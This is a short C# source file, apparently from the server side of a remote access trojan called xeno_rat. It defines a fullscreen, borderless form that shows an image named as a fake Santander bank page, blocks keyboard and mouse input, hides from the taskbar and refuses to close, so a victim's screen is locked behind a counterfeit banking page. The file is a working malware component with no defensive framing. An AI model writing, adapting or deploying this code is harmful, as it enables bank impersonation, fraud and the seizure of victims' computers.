using System;
using System.Drawing;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public class LockScreenForm : Form
    {
        public LockScreenForm()
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.BackColor = Color.White;
            this.BackgroundImage = Image.FromFile("santander_fake_page.png");
            this.BackgroundImageLayout = ImageLayout.Stretch;
            this.ShowInTaskbar = false;
            this.ControlBox = false;
            this.Text = string.Empty;
            this.Enabled = false;
            this.KeyDown += (s, ev) => ev.Handled = true;
            this.MouseDown += (s, ev) => ev.Handled = true;
            this.MouseMove += (s, ev) => ev.Handled = true;
            this.MouseUp += (s, ev) => ev.Handled = true;
            this.FormClosing += (s, ev) => ev.Cancel = true;
        }
    }
}
